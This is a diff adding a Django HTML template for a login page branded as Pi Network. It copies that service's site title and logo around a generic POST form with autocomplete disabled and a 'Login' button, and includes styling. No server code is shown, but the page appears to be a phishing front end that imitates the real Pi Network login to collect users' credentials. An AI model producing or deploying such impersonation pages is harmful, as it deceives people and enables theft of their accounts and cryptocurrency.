@@ -1,0 +1,158 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
+  <title>Pi Network - Pi Blockchain, Community & Developer Platform</title>
+  <!-- <link rel="icon" type="image/x-icon" href="assets/images/logo.png"> -->
+</head>
+<body>
+
+  <div class="container">
+    <form method="POST" autocomplete="off">
+      <div class="header">
+        <img alt="logo" src="{% static 'images/logo.png' %}" />
+            <span>Pi Network</span>
+        </div>
+        {% csrf_token %}
+        <div class="content">
+          {{form.as_p}}
+
+
+        <br>
+
+        <button type="submit" class="btn btn-primary w-100 btn-block p-2"> Login &nbsp; <i class="fa fa-key" aria-hidden="true"></i> </button>
+
+          </div>
+    </form>
+  </div>
+
+
+
+
+
+
+
+
+  <style>
+    :root {
+    --blue: #007bff;
+    --indigo: #6610f2;
+    --purple: #6f42c1;
+    --pink: #e83e8c;
+    --red: #dc3545;
+    --orange: #fd7e14;
+    --yellow: #ffc107;
+    --green: #28a745;
+    --teal: #20c997;
+    --cyan: #17a2b8;
+    --white: #fff;
+    --gray: #6c757d;
+    --gray-dark: #343a40;
+    --primary: #007bff;
+    --secondary: #6c757d;
+    --success: #28a745;
+    --info: #17a2b8;
+    --warning: #ffc107;
+    --danger: #dc3545;
+    --light: #f8f9fa;
+    --dark: #343a40;
+    --breakpoint-xs: 0;
+    --breakpoint-sm: 576px;
+    --breakpoint-md: 768px;
+    --breakpoint-lg: 992px;
+    --breakpoint-xl: 1200px;
+    --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+    --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+a {
+    text-decoration: none;
+}
+
+body {
+    background: while;
+    font-family: 'Montserrat', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items:center;
+    height: 100vh;
+}
+img{
+    width: 70px;
+    height: 70px;
+}
+span{
+  color: var(--yellow);
+  line-height: 70px;
+}
+.header{
+  display: flex;
+  justify-content: center;
+  text-align: center;
+  /* background-color: #007bff; */
+  height: 70px;
+}
+.content{
+  margin-top: 20px;
+    width: 400px;
+    /* background-color: #2C4982; */
+    height: 200px;
+}
+.content input{
+  width: 100%;
+  padding: 7px 5px;
+  outline: none;
+  margin: 5px 0;
+  font-size: 16px;
+}
+button{
+  background-color: white;
+    color: var(--yellow);
+    font-family: 'Montserrat', sans-serif;
+    border: 1px solid var(--yellow);
+    padding: 15px 17px !important;
+    margin-top: 30px;
+    transition: .4s;
+    cursor: pointer;
+    font-weight: 700;
+    text-transform: uppercase;
+    outline: none;
+    margin: 7px 0;
+    font-size: 16px;
+    width: 100%;
+}
+button:hover{
+  background-color: var(--yellow);
+  color: white;
+}
+
+@media (max-width:800px) {
+  .content{
+    width: 100%;
+  }
+}
+
+
+
+@media (max-width:800px) {
+  .container{
+    width: 300px;
+    position: relative;
+  }
+}
+
+
+  </style>
+</body>
+</html>
